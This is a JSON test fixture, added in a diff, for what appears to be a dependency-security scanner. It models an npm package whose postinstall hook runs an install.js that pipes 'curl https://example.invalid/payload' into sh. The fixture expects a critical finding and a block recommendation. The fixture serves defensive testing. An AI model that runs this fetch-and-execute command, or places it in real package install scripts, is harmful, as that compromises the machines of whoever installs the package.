@@ -1,0 +1,67 @@
+{
+  "id": "added-dependency-truncated-install-dropper",
+  "title": "Unrelated truncation cannot erase a proven install dropper",
+  "category": "dependency-introduction",
+  "intent": "The retained lifecycle path proves remote-shell behavior while an unrelated large file is incomplete. Drydock must preserve the critical install-risk evidence and also report the coverage gap.",
+  "previousPackageJson": { "name": "consumer", "version": "1.0.0" },
+  "stagedPackageJson": {
+    "name": "consumer",
+    "version": "1.1.0",
+    "dependencies": { "truncated-dropper": "1.0.0" }
+  },
+  "dependencyArtifacts": {
+    "truncated-dropper": {
+      "version": "1.0.0",
+      "packageJson": {
+        "name": "truncated-dropper",
+        "version": "1.0.0",
+        "scripts": { "postinstall": "node install.js" }
+      },
+      "files": [
+        {
+          "path": "package.json",
+          "size": 107,
+          "sha256": "aaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaa",
+          "textSample": "{\"name\":\"truncated-dropper\",\"version\":\"1.0.0\",\"scripts\":{\"postinstall\":\"node install.js\"}}",
+          "flags": []
+        },
+        {
+          "path": "install.js",
+          "size": 95,
+          "sha256": "bbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbb",
+          "textSample": "require('node:child_process').execSync('curl https://example.invalid/payload | sh')",
+          "flags": []
+        },
+        {
+          "path": "unrelated.bin",
+          "size": 4096,
+          "sha256": "cccccccccccccccccccccccccccccccccccccccccccccccccccccccccccccccc",
+          "flags": ["content-skipped"]
+        }
+      ]
+    }
+  },
+  "expectedDependencies": [
+    {
+      "name": "truncated-dropper",
+      "status": "uninspectable",
+      "reason": "artifact-truncated",
+      "resolvedVersion": "1.0.0",
+      "observation": { "execution": "observed", "risk": "observed" }
+    }
+  ],
+  "expectedFindings": [
+    {
+      "ruleId": "dependency.install-time-capability",
+      "severity": "critical",
+      "file": "<dependency>truncated-dropper@1.0.0:package.json"
+    },
+    {
+      "ruleId": "dependency.artifact-unavailable",
+      "severity": "medium",
+      "file": "<dependency>truncated-dropper@1.0.0"
+    }
+  ],
+  "expectedRisk": "critical",
+  "expectedRecommendation": "block manual approval"
+}
